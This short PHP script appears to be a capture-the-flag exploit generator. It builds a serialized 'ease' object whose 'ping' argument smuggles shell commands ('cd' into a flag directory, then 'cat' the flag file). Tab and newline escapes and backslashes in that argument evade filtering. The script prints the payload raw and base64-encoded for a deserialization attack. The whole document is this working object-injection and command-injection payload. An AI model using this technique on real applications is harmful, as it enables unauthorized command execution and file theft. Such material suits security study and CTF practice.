<?php
 
class ease{
	private $method;
	private $args;
	function __construct($method, $args) {
	    $this->method = $method;
	    $this->args = $args;
	}
  
}
$a = new ease("ping",array("cd\x09fl\ag_1\s_here\x0ac\at\x09fl\ag_831b69012c67b35f.p\hp"));
$b = serialize($a);
echo $b;
echo "\n";
echo base64_encode($b);
?>
